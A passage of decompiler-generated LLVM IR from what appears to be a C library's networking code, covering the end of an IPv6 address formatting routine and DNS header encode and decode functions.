  %v2_1976c = inttoptr i32 %v1_1976c to i8*
  %v3_1976c = load i8, i8* %v2_1976c, align 1
  %v4_1976c = zext i8 %v3_1976c to i32
  %v3_19770 = inttoptr i32 %v2_19790 to i8*
  %v4_19770 = load i8, i8* %v3_19770, align 1
  %v6_19770 = zext i8 %v4_19770 to i32
  store i32 %v6_19770, i32* %r2.global-to-local, align 4
  %v4_19774 = mul nuw nsw i32 %v6_19770, 256
  %v5_19774 = or i32 %v4_19774, %v4_1976c
  %v2_19778 = add i32 %v5_19794, -32
  %v3_19778 = inttoptr i32 %v2_19778 to i32*
  store i32 %v5_19774, i32* %v3_19778, align 4
  %v0_1977c = load i32, i32* %r1.global-to-local, align 4
  %v1_1977c = add i32 %v0_1977c, 2
  br label %dec_label_pc_19780

dec_label_pc_19780:                               ; preds = %dec_label_pc_19754, %dec_label_pc_1976c
  %v1_19770 = phi i32 [ 0, %dec_label_pc_19754 ], [ %v1_1977c, %dec_label_pc_1976c ]
  store i32 %v1_19770, i32* %r1.global-to-local, align 4
  %v0_19790 = load i32, i32* @r8, align 4
  %v2_19790 = add i32 %v0_19790, %v1_19770
  store i32 %v2_19790, i32* %r2.global-to-local, align 4
  %v7_19798 = icmp sgt i32 %v1_19770, 15
  br i1 %v7_19798, label %dec_label_pc_1979c, label %dec_label_pc_1976c

dec_label_pc_1979c:                               ; preds = %dec_label_pc_19780
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_197ac

dec_label_pc_197ac:                               ; preds = %dec_label_pc_1979c, %dec_label_pc_197f8
  %v0_197ec = phi i32 [ -1, %dec_label_pc_1979c ], [ %v0_19820, %dec_label_pc_197f8 ]
  %v0_197dc = phi i32 [ -1, %dec_label_pc_1979c ], [ %v0_1980c, %dec_label_pc_197f8 ]
  %v0_197c0 = phi i32 [ -1, %dec_label_pc_1979c ], [ %v0_197c08, %dec_label_pc_197f8 ]
  %v0_197f8 = phi i32 [ 0, %dec_label_pc_1979c ], [ %v1_197f8, %dec_label_pc_197f8 ]
  %v4_197b0 = mul nuw nsw i32 %v0_197f8, 4
  %v5_197b0 = add i32 %v4_197b0, %v25_19718
  %v1_197b4 = add i32 %v5_197b0, -32
  %v2_197b4 = inttoptr i32 %v1_197b4 to i32*
  %v3_197b4 = load i32, i32* %v2_197b4, align 4
  %v2_197b8 = icmp eq i32 %v3_197b4, 0
  %v7_197c0 = icmp eq i32 %v0_197c0, -1
  br i1 %v2_197b8, label %dec_label_pc_197c0, label %dec_label_pc_197d4

dec_label_pc_197c0:                               ; preds = %dec_label_pc_197ac
  br i1 %v7_197c0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_197c0
  store i32 %v0_197f8, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_197f8

.thread:                                          ; preds = %dec_label_pc_197c0
  %v1_197cc.pre = load i32, i32* @r4, align 4
  %v2_197cc = add i32 %v1_197cc.pre, 1
  store i32 %v2_197cc, i32* @r4, align 4
  br label %dec_label_pc_197f8

dec_label_pc_197d4:                               ; preds = %dec_label_pc_197ac
  br i1 %v7_197c0, label %dec_label_pc_197f8, label %dec_label_pc_197dc

dec_label_pc_197dc:                               ; preds = %dec_label_pc_197d4
  %v7_197dc = icmp eq i32 %v0_197dc, -1
  %v0_197f0.pre = load i32, i32* @r4, align 4
  %v1_197e4 = load i32, i32* @r7, align 4
  %v7_197e8 = icmp sgt i32 %v0_197f0.pre, %v1_197e4
  %or.cond = or i1 %v7_197dc, %v7_197e8
  br i1 %or.cond, label %dec_label_pc_197ec, label %dec_label_pc_197f4

dec_label_pc_197ec:                               ; preds = %dec_label_pc_197dc
  store i32 %v0_197ec, i32* @r6, align 4
  store i32 %v0_197f0.pre, i32* @r7, align 4
  br label %dec_label_pc_197f4

dec_label_pc_197f4:                               ; preds = %dec_label_pc_197dc, %dec_label_pc_197ec
  %v0_197dc13 = phi i32 [ %v0_197ec, %dec_label_pc_197ec ], [ %v0_197dc, %dec_label_pc_197dc ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_197f8

dec_label_pc_197f8:                               ; preds = %bb, %.thread, %dec_label_pc_197d4, %dec_label_pc_197f4
  %v0_19820 = phi i32 [ %v0_197ec, %.thread ], [ %v0_197f8, %bb ], [ %v0_197ec, %dec_label_pc_197d4 ], [ -1, %dec_label_pc_197f4 ]
  %v0_197c08 = phi i32 [ %v0_197c0, %.thread ], [ %v0_197f8, %bb ], [ -1, %dec_label_pc_197d4 ], [ -1, %dec_label_pc_197f4 ]
  %v0_1980c = phi i32 [ %v0_197dc, %.thread ], [ %v0_197dc, %bb ], [ %v0_197dc, %dec_label_pc_197d4 ], [ %v0_197dc13, %dec_label_pc_197f4 ]
  %v1_197f8 = add nuw nsw i32 %v0_197f8, 1
  store i32 %v1_197f8, i32* %r1.global-to-local, align 4
  %v7_19800 = icmp slt i32 %v1_197f8, 8
  br i1 %v7_19800, label %dec_label_pc_197ac, label %dec_label_pc_19804

dec_label_pc_19804:                               ; preds = %dec_label_pc_197f8
  %v7_19804 = icmp eq i32 %v0_19820, -1
  br i1 %v7_19804, label %dec_label_pc_19824, label %dec_label_pc_1980c

dec_label_pc_1980c:                               ; preds = %dec_label_pc_19804
  %v7_1980c = icmp eq i32 %v0_1980c, -1
  %v0_1981c.pre = load i32, i32* @r4, align 4
  br i1 %v7_1980c, label %dec_label_pc_1981c, label %dec_label_pc_19814

dec_label_pc_19814:                               ; preds = %dec_label_pc_1980c
  %v1_19814 = load i32, i32* @r7, align 4
  %v7_19818 = icmp sgt i32 %v0_1981c.pre, %v1_19814
  br i1 %v7_19818, label %dec_label_pc_1981c, label %dec_label_pc_19824

dec_label_pc_1981c:                               ; preds = %dec_label_pc_1980c, %dec_label_pc_19814
  store i32 %v0_1981c.pre, i32* @r7, align 4
  store i32 %v0_19820, i32* @r6, align 4
  br label %dec_label_pc_19824

dec_label_pc_19824:                               ; preds = %dec_label_pc_19814, %dec_label_pc_19804, %dec_label_pc_1981c
  %v0_19824 = phi i32 [ %v0_1980c, %dec_label_pc_19814 ], [ %v0_1980c, %dec_label_pc_19804 ], [ %v0_19820, %dec_label_pc_1981c ]
  %v7_19824 = icmp eq i32 %v0_19824, -1
  br i1 %v7_19824, label %bb49, label %dec_label_pc_1982c

dec_label_pc_1982c:                               ; preds = %dec_label_pc_19824
  %v0_1982c = load i32, i32* @r7, align 4
  %v7_19830 = icmp slt i32 %v0_1982c, 2
  br i1 %v7_19830, label %bb48, label %bb49

bb48:                                             ; preds = %dec_label_pc_1982c
  store i32 -1, i32* @r6, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_19824, %dec_label_pc_1982c, %bb48
  %v0_1984023 = phi i32 [ %v0_19824, %dec_label_pc_19824 ], [ %v0_19824, %dec_label_pc_1982c ], [ -1, %bb48 ]
  %v2_19834 = ptrtoint i32* %stack_var_-110 to i32
  store i32 %v2_19834, i32* @r4, align 4
  %v9_198a0 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @r5, align 4
  %v7_1984063 = icmp eq i32 %v0_1984023, -1
  br label %dec_label_pc_19840

dec_label_pc_19840:                               ; preds = %bb49, %dec_label_pc_198f4
  %v7_1984067 = phi i1 [ %v7_1984063, %bb49 ], [ %v7_19840, %dec_label_pc_198f4 ]
  %v0_1986c66 = phi i32 [ 0, %bb49 ], [ %v1_198f4, %dec_label_pc_198f4 ]
  %v1_1985c65 = phi i32 [ %v0_1984023, %bb49 ], [ %v0_19840.pre, %dec_label_pc_198f4 ]
  %v3_1987464 = phi i32 [ %v2_19834, %bb49 ], [ %v3_1986424, %dec_label_pc_198f4 ]
  br i1 %v7_1984067, label %dec_label_pc_1986c, label %dec_label_pc_19848

dec_label_pc_19848:                               ; preds = %dec_label_pc_19840
  %v9_19848 = icmp eq i32 %v0_1986c66, %v1_1985c65
  %v5_1984c = icmp slt i32 %v0_1986c66, %v1_1985c65
  br i1 %v5_1984c, label %dec_label_pc_1986c, label %dec_label_pc_19850

dec_label_pc_19850:                               ; preds = %dec_label_pc_19848
  %v1_19850 = load i32, i32* @r7, align 4
  %v2_19850 = add i32 %v1_19850, %v1_1985c65
  %v6_19858 = icmp slt i32 %v0_1986c66, %v2_19850
  br i1 %v6_19858, label %dec_label_pc_1985c, label %dec_label_pc_1986c

dec_label_pc_1985c:                               ; preds = %dec_label_pc_19850
  br i1 %v9_19848, label %bb51, label %dec_label_pc_198f4

bb51:                                             ; preds = %dec_label_pc_1985c
  %v4_19864 = inttoptr i32 %v3_1987464 to i8*
  store i8 58, i8* %v4_19864, align 1
  %v5_19864 = load i32, i32* @r4, align 4
  %v6_19864 = add i32 %v5_19864, 1
  store i32 %v6_19864, i32* @r4, align 4
  br label %dec_label_pc_198f4

dec_label_pc_1986c:                               ; preds = %dec_label_pc_19850, %dec_label_pc_19848, %dec_label_pc_19840
  %v2_1986c = icmp eq i32 %v0_1986c66, 0
  br i1 %v2_1986c, label %.thread3, label %bb52

bb52:                                             ; preds = %dec_label_pc_1986c
  %v4_19874 = inttoptr i32 %v3_1987464 to i8*
  store i8 58, i8* %v4_19874, align 1
  %v5_19874 = load i32, i32* @r4, align 4
  %v6_19874 = add i32 %v5_19874, 1
  store i32 %v6_19874, i32* @r4, align 4
  %v0_19878.pre = load i32, i32* @r5, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1986c, %bb52
  %v0_198b8 = phi i32 [ %v3_1987464, %dec_label_pc_1986c ], [ %v6_19874, %bb52 ]
  %v1_198dc = phi i32 [ 0, %dec_label_pc_1986c ], [ %v0_19878.pre, %bb52 ]
  %v7_19878 = icmp eq i32 %v1_198dc, 6
  br i1 %v7_19878, label %dec_label_pc_19880, label %dec_label_pc_198d8

dec_label_pc_19880:                               ; preds = %.thread3
  %v0_19880 = load i32, i32* @r6, align 4
  %v2_19880 = icmp eq i32 %v0_19880, 0
  br i1 %v2_19880, label %dec_label_pc_19888, label %dec_label_pc_198d8

dec_label_pc_19888:                               ; preds = %dec_label_pc_19880
  %v0_19888 = load i32, i32* @r7, align 4
  %v7_19888 = icmp eq i32 %v0_19888, 6
  br i1 %v7_19888, label %dec_label_pc_198a8, label %dec_label_pc_19890

dec_label_pc_19890:                               ; preds = %dec_label_pc_19888
  %v7_19890 = icmp eq i32 %v0_19888, 5
  br i1 %v7_19890, label %dec_label_pc_19898, label %dec_label_pc_198d8

dec_label_pc_19898:                               ; preds = %dec_label_pc_19890
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br i1 %v9_198a0, label %dec_label_pc_198a8, label %dec_label_pc_198d8

dec_label_pc_198a8:                               ; preds = %dec_label_pc_19898, %dec_label_pc_19888
  %v2_198ac = sub i32 %v25_19718, %v0_198b8
  %v0_198b0 = load i32, i32* @r8, align 4
  %v1_198b0 = add i32 %v0_198b0, 12
  %v1_198b4 = add i32 %v2_198ac, -32
  store i32 %v1_198b4, i32* %r2.global-to-local, align 4
  store i32 %v0_198b8, i32* %r1.global-to-local, align 4
  %v3_198bc = call i32 @inet_ntop4(i32 %v1_198b0, i32 %v0_198b8, i32 %v1_198b4)
  %v2_198c0 = icmp eq i32 %v3_198bc, 0
  br i1 %v2_198c0, label %dec_label_pc_1994c, label %dec_label_pc_198c8

dec_label_pc_198c8:                               ; preds = %dec_label_pc_198a8
  %v0_198c8 = load i32, i32* @r4, align 4
  %v1_198c8 = inttoptr i32 %v0_198c8 to i8*
  %v3_198cc = call i32 @strlen(i8* %v1_198c8)
  %v0_198d0 = load i32, i32* @r4, align 4
  %v2_198d0 = add i32 %v0_198d0, %v3_198cc
  store i32 %v2_198d0, i32* @r4, align 4
  %v0_19908.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_19908

dec_label_pc_198d8:                               ; preds = %dec_label_pc_19898, %dec_label_pc_19890, %dec_label_pc_19880, %.thread3
  %v4_198dc = mul i32 %v1_198dc, 4
  %v5_198dc = add i32 %v4_198dc, %v25_19718
  store i32 %v0_198b8, i32* @r0, align 4
  %v1_198e4 = add i32 %v5_198dc, -32
  %v2_198e4 = inttoptr i32 %v1_198e4 to i32*
  %v3_198e4 = load i32, i32* %v2_198e4, align 4
  store i32 %v3_198e4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_20f88.1383 to i32), i32* %r1.global-to-local, align 4
  %v3_198ec = call i32 @sprintf(i32 %v0_198b8, i32 ptrtoint ([3 x i8]* @global_var_20f88.1383 to i32))
  %v0_198f0 = load i32, i32* @r4, align 4
  %v2_198f0 = add i32 %v0_198f0, %v3_198ec
  store i32 %v2_198f0, i32* @r4, align 4
  br label %dec_label_pc_198f4

dec_label_pc_198f4:                               ; preds = %dec_label_pc_1985c, %bb51, %dec_label_pc_198d8
  %v3_1986424 = phi i32 [ %v3_1987464, %dec_label_pc_1985c ], [ %v6_19864, %bb51 ], [ %v2_198f0, %dec_label_pc_198d8 ]
  %v0_198f4 = load i32, i32* @r5, align 4
  %v1_198f4 = add i32 %v0_198f4, 1
  %v0_19840.pre = load i32, i32* @r6, align 4
  store i32 %v1_198f4, i32* @r5, align 4
  %v7_198fc = icmp slt i32 %v1_198f4, 8
  %v7_19840 = icmp eq i32 %v0_19840.pre, -1
  br i1 %v7_198fc, label %dec_label_pc_19840, label %dec_label_pc_19900

dec_label_pc_19900:                               ; preds = %dec_label_pc_198f4
  br i1 %v7_19840, label %.thread4, label %dec_label_pc_19908

dec_label_pc_19908:                               ; preds = %dec_label_pc_19900, %dec_label_pc_198c8
  %v3_19914 = phi i32 [ %v3_1986424, %dec_label_pc_19900 ], [ %v2_198d0, %dec_label_pc_198c8 ]
  %v0_19908 = phi i32 [ %v0_19840.pre, %dec_label_pc_19900 ], [ %v0_19908.pre, %dec_label_pc_198c8 ]
  %v1_19908 = load i32, i32* @r7, align 4
  %v2_19908 = add i32 %v1_19908, %v0_19908
  %v7_1990c = icmp eq i32 %v2_19908, 8
  br i1 %v7_1990c, label %bb53, label %.thread4

bb53:                                             ; preds = %dec_label_pc_19908
  %v4_19914 = inttoptr i32 %v3_19914 to i8*
  store i8 58, i8* %v4_19914, align 1
  %v5_19914 = load i32, i32* @r4, align 4
  %v6_19914 = add i32 %v5_19914, 1
  store i32 %v6_19914, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_19908, %dec_label_pc_19900, %bb53
  %v2_1991c = phi i32 [ %v3_19914, %dec_label_pc_19908 ], [ %v3_1986424, %dec_label_pc_19900 ], [ %v6_19914, %bb53 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1991c = inttoptr i32 %v2_1991c to i8*
  store i8 0, i8* %v3_1991c, align 1
  %v4_1991c = load i32, i32* @r4, align 4
  %v5_1991c = add i32 %v4_1991c, 1
  store i32 %v2_19834, i32* %r1.global-to-local, align 4
  %v2_19924 = sub i32 %v5_1991c, %v2_19834
  %v1_19928 = load i32, i32* @sl, align 4
  %tmp69 = icmp ugt i32 %v2_19924, %v1_19928
  br i1 %tmp69, label %dec_label_pc_19930, label %dec_label_pc_19944

dec_label_pc_19930:                               ; preds = %.thread4
  %v0_19930 = call i32 @__errno_location()
  %v0_19938 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_19938, i32* %r2.global-to-local, align 4
  %v2_1993c = inttoptr i32 %v0_19930 to i32*
  store i32 28, i32* %v2_1993c, align 4
  %v0_19964.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19964

dec_label_pc_19944:                               ; preds = %.thread4
  %v0_19944 = load i32, i32* @sb, align 4
  %v2_19948 = bitcast i32* %stack_var_-110 to i8*
  %v3_19948 = call i32 @strcpy(i32 %v0_19944, i8* %v2_19948)
  br label %dec_label_pc_1994c

dec_label_pc_1994c:                               ; preds = %dec_label_pc_198a8, %dec_label_pc_19740, %dec_label_pc_19944
  %v0_1994c = phi i32 [ 0, %dec_label_pc_198a8 ], [ %v3_1974c, %dec_label_pc_19740 ], [ %v3_19948, %dec_label_pc_19944 ]
  store i32 %v0_1994c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19964

dec_label_pc_19954:                               ; preds = %dec_label_pc_19734
  %v0_19954 = call i32 @__errno_location()
  %v2_1995c = inttoptr i32 %v0_19954 to i32*
  store i32 97, i32* %v2_1995c, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19964

dec_label_pc_19964:                               ; preds = %dec_label_pc_1994c, %dec_label_pc_19930, %dec_label_pc_19954
  %v0_19964 = phi i32 [ %v0_1994c, %dec_label_pc_1994c ], [ %v0_19964.pre, %dec_label_pc_19930 ], [ 0, %dec_label_pc_19954 ]
  store i32 %v6_19718, i32* %r5.global-to-local, align 4
  ret i32 %v0_19964

; uselistorder directives
  uselistorder i1 %v7_19840, { 1, 0 }
  uselistorder i32 %v0_19840.pre, { 1, 0, 2 }
  uselistorder i32 %v1_198f4, { 1, 0, 2 }
  uselistorder i32 %v0_198b8, { 4, 3, 1, 0, 2 }
  uselistorder i32 %v3_1987464, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1985c65, { 2, 0, 1 }
  uselistorder i32 %v0_1986c66, { 3, 2, 0, 1 }
  uselistorder i32 %v2_19834, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1984023, { 1, 0 }
  uselistorder i32 %v0_19824, { 1, 2, 0 }
  uselistorder i32 %v1_197f8, { 1, 2, 0 }
  uselistorder i32 %v0_1980c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_19820, { 1, 2, 0, 3 }
  uselistorder i1 %v7_197c0, { 1, 0 }
  uselistorder i32 %v0_197f8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_197dc, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_197ec, { 3, 1, 0, 2 }
  uselistorder i32 %v2_19790, { 2, 1, 0 }
  uselistorder i32 %v1_19770, { 3, 1, 4, 0, 2 }
  uselistorder i32 %v25_19718, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 7, 5, 4, 8, 9, 0 }
  uselistorder i32 97, { 5, 6, 10, 0, 1, 9, 7, 8, 2, 3, 4 }
  uselistorder i32 (i32, i8*)* @strcpy, { 0, 4, 5, 1, 2, 3, 6 }
  uselistorder i32 (i32, i32)* @sprintf, { 2, 1, 0 }
  uselistorder i8 58, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i8*, i32)* @__GI_memset, { 11, 12, 18, 19, 20, 9, 26, 24, 13, 25, 10, 1, 2, 3, 4, 5, 6, 0, 7, 8, 21, 22, 23, 14, 15, 16, 17 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_19964, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1994c, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_198f4, { 2, 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_19840, { 1, 0 }
  uselistorder label %bb49, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19824, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1981c, { 1, 0 }
  uselistorder label %dec_label_pc_197f8, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_197f4, { 1, 0 }
  uselistorder label %dec_label_pc_197ac, { 1, 0 }
  uselistorder label %dec_label_pc_19780, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_1997c = load i32, i32* @r4, align 4
  store i32 %v3_1997c, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v7_1998c = icmp sgt i32 %arg3, 11
  br i1 %v7_1998c, label %dec_label_pc_19990, label %dec_label_pc_19a58

dec_label_pc_19990:                               ; preds = %entry
  %tmp18 = inttoptr i32 %arg2 to i8*
  %v1_19990 = add i32 %tmp, 1
  %v2_19990 = inttoptr i32 %v1_19990 to i8*
  %v3_19990 = load i8, i8* %v2_19990, align 1
  store i8 %v3_19990, i8* %tmp18, align 1
  %v2_19998 = load i32, i32* %arg1, align 4
  %v1_1999c = trunc i32 %v2_19998 to i8
  %v4_1999c = add i32 %arg2, 1
  %v5_1999c = inttoptr i32 %v4_1999c to i8*
  store i8 %v1_1999c, i8* %v5_1999c, align 1
  %v0_199a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_199a0 = add i32 %v0_199a0, 12
  %v2_199a0 = inttoptr i32 %v1_199a0 to i32*
  %v3_199a0 = load i32, i32* %v2_199a0, align 4
  %v1_199a4 = add i32 %v0_199a0, 4
  %v2_199a4 = inttoptr i32 %v1_199a4 to i32*
  %v3_199a4 = load i32, i32* %v2_199a4, align 4
  %v1_199a8 = add i32 %v0_199a0, 16
  %v2_199a8 = inttoptr i32 %v1_199a8 to i32*
  %v3_199a8 = load i32, i32* %v2_199a8, align 4
  %v1_199ac = add i32 %tmp, 8
  %v2_199ac = inttoptr i32 %v1_199ac to i32*
  %v3_199ac = load i32, i32* %v2_199ac, align 4
  %v2_199b0 = icmp eq i32 %v3_199a0, 0
  %. = select i1 %v2_199b0, i32 0, i32 4
  %v2_199bc = icmp eq i32 %v3_199a4, 0
  %v1_199c0 = add i32 %v0_199a0, 20
  %v2_199c0 = inttoptr i32 %v1_199c0 to i32*
  %v3_199c0 = load i32, i32* %v2_199c0, align 4
  %storemerge12 = select i1 %v2_199bc, i32 0, i32 128
  %v1_199cc = urem i32 %v3_199ac, 16
  %v2_199d0 = icmp eq i32 %v3_199a8, 0
  %.29 = select i1 %v2_199d0, i32 0, i32 2
  %v4_199dc = mul nuw nsw i32 %v1_199cc, 8
  %v5_199dc = or i32 %v4_199dc, %.
  %v2_199e0 = icmp eq i32 %v3_199c0, 0
  br i1 %v2_199e0, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_19990
  %v2_199e4 = or i32 %v5_199dc, 1
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_19990, %bb25
  %v1_199ec = phi i32 [ %v5_199dc, %dec_label_pc_19990 ], [ %v2_199e4, %bb25 ]
  %v2_199e8 = or i32 %.29, %storemerge12
  %v2_199ec = or i32 %v2_199e8, %v1_199ec
  %v1_199f0 = trunc i32 %v2_199ec to i8
  %v2_199f0 = load i32, i32* %r4.global-to-local, align 4
  %v3_199f0 = add i32 %v2_199f0, 2
  %v4_199f0 = inttoptr i32 %v3_199f0 to i8*
  store i8 %v1_199f0, i8* %v4_199f0, align 1
  %v0_199f4 = load i32, i32* %lr.global-to-local, align 4
  %v1_199f4 = add i32 %v0_199f4, 24
  %v1_199f8 = inttoptr i32 %v1_199f4 to i32*
  %v2_199f8 = load i32, i32* %v1_199f8, align 4
  %v3_199f8 = add i32 %v0_199f4, 28
  %v4_199f8 = inttoptr i32 %v3_199f8 to i32*
  %v5_199f8 = load i32, i32* %v4_199f8, align 4
  %v2_199fc = icmp eq i32 %v2_199f8, 0
  %v1_19a00 = urem i32 %v5_199f8, 16
  %.30 = select i1 %v2_199fc, i32 0, i32 128
  %v2_19a0c = or i32 %v1_19a00, %.30
  %v1_19a10 = trunc i32 %v2_19a0c to i8
  %v2_19a10 = load i32, i32* %r4.global-to-local, align 4
  %v3_19a10 = add i32 %v2_19a10, 3
  %v4_19a10 = inttoptr i32 %v3_19a10 to i8*
  store i8 %v1_19a10, i8* %v4_19a10, align 1
  %v0_19a14 = load i32, i32* %lr.global-to-local, align 4
  %v1_19a14 = add i32 %v0_19a14, 33
  %v2_19a14 = inttoptr i32 %v1_19a14 to i8*
  %v3_19a14 = load i8, i8* %v2_19a14, align 1
  %v2_19a18 = load i32, i32* %r4.global-to-local, align 4
  %v3_19a18 = add i32 %v2_19a18, 4
  %v4_19a18 = inttoptr i32 %v3_19a18 to i8*
  store i8 %v3_19a14, i8* %v4_19a18, align 1
  %v0_19a1c = load i32, i32* %lr.global-to-local, align 4
  %v1_19a1c = add i32 %v0_19a1c, 32
  %v2_19a1c = inttoptr i32 %v1_19a1c to i32*
  %v3_19a1c = load i32, i32* %v2_19a1c, align 4
  %v1_19a20 = trunc i32 %v3_19a1c to i8
  %v2_19a20 = load i32, i32* %r4.global-to-local, align 4
  %v3_19a20 = add i32 %v2_19a20, 5
  %v4_19a20 = inttoptr i32 %v3_19a20 to i8*
  store i8 %v1_19a20, i8* %v4_19a20, align 1
  %v0_19a24 = load i32, i32* %lr.global-to-local, align 4
  %v1_19a24 = add i32 %v0_19a24, 37
  %v2_19a24 = inttoptr i32 %v1_19a24 to i8*
  %v3_19a24 = load i8, i8* %v2_19a24, align 1
  %v2_19a28 = load i32, i32* %r4.global-to-local, align 4
  %v3_19a28 = add i32 %v2_19a28, 6
  %v4_19a28 = inttoptr i32 %v3_19a28 to i8*
  store i8 %v3_19a24, i8* %v4_19a28, align 1
  %v0_19a2c = load i32, i32* %lr.global-to-local, align 4
  %v1_19a2c = add i32 %v0_19a2c, 36
  %v2_19a2c = inttoptr i32 %v1_19a2c to i32*
  %v3_19a2c = load i32, i32* %v2_19a2c, align 4
  %v1_19a30 = trunc i32 %v3_19a2c to i8
  %v2_19a30 = load i32, i32* %r4.global-to-local, align 4
  %v3_19a30 = add i32 %v2_19a30, 7
  %v4_19a30 = inttoptr i32 %v3_19a30 to i8*
  store i8 %v1_19a30, i8* %v4_19a30, align 1
  %v0_19a34 = load i32, i32* %lr.global-to-local, align 4
  %v1_19a34 = add i32 %v0_19a34, 41
  %v2_19a34 = inttoptr i32 %v1_19a34 to i8*
  %v3_19a34 = load i8, i8* %v2_19a34, align 1
  %v2_19a38 = load i32, i32* %r4.global-to-local, align 4
  %v3_19a38 = add i32 %v2_19a38, 8
  %v4_19a38 = inttoptr i32 %v3_19a38 to i8*
  store i8 %v3_19a34, i8* %v4_19a38, align 1
  %v0_19a3c = load i32, i32* %lr.global-to-local, align 4
  %v1_19a3c = add i32 %v0_19a3c, 40
  %v2_19a3c = inttoptr i32 %v1_19a3c to i32*
  %v3_19a3c = load i32, i32* %v2_19a3c, align 4
  %v1_19a40 = trunc i32 %v3_19a3c to i8
  %v2_19a40 = load i32, i32* %r4.global-to-local, align 4
  %v3_19a40 = add i32 %v2_19a40, 9
  %v4_19a40 = inttoptr i32 %v3_19a40 to i8*
  store i8 %v1_19a40, i8* %v4_19a40, align 1
  %v0_19a44 = load i32, i32* %lr.global-to-local, align 4
  %v1_19a44 = add i32 %v0_19a44, 45
  %v2_19a44 = inttoptr i32 %v1_19a44 to i8*
  %v3_19a44 = load i8, i8* %v2_19a44, align 1
  %v2_19a48 = load i32, i32* %r4.global-to-local, align 4
  %v3_19a48 = add i32 %v2_19a48, 10
  %v4_19a48 = inttoptr i32 %v3_19a48 to i8*
  store i8 %v3_19a44, i8* %v4_19a48, align 1
  %v0_19a4c = load i32, i32* %lr.global-to-local, align 4
  %v1_19a4c = add i32 %v0_19a4c, 44
  %v2_19a4c = inttoptr i32 %v1_19a4c to i32*
  %v3_19a4c = load i32, i32* %v2_19a4c, align 4
  %v1_19a50 = trunc i32 %v3_19a4c to i8
  %v2_19a50 = load i32, i32* %r4.global-to-local, align 4
  %v3_19a50 = add i32 %v2_19a50, 11
  %v4_19a50 = inttoptr i32 %v3_19a50 to i8*
  store i8 %v1_19a50, i8* %v4_19a50, align 1
  %v2_19a5c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_19a58

dec_label_pc_19a58:                               ; preds = %entry, %bb26
  %v2_19a5c = phi i32 [ %v3_1997c, %entry ], [ %v2_19a5c.pre, %bb26 ]
  %v0_19a58 = phi i32 [ -1, %entry ], [ 12, %bb26 ]
  store i32 %v2_19a5c, i32* @r4, align 4
  ret i32 %v0_19a58

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 45, { 2, 1, 0 }
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 3, 2, 0, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_19a58, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_19a60 = load i8, i8* %arg1, align 1
  %v4_19a60 = zext i8 %v3_19a60 to i32
  %v2_19a64 = add i32 %tmp, 1
  %v3_19a64 = inttoptr i32 %v2_19a64 to i8*
  %v4_19a64 = load i8, i8* %v3_19a64, align 1
  %v5_19a64 = zext i8 %v4_19a64 to i32
  %v4_19a68 = mul nuw nsw i32 %v4_19a60, 256
  %v5_19a68 = or i32 %v5_19a64, %v4_19a68
  %v2_19a6c = inttoptr i32 %arg2 to i32*
  store i32 %v5_19a68, i32* %v2_19a6c, align 4
  %v2_19a70 = add i32 %tmp, 2
  %v3_19a70 = inttoptr i32 %v2_19a70 to i8*
  %v4_19a70 = load i8, i8* %v3_19a70, align 1
  %tmp4 = icmp slt i8 %v4_19a70, 0
  %v3_19a74 = zext i1 %tmp4 to i32
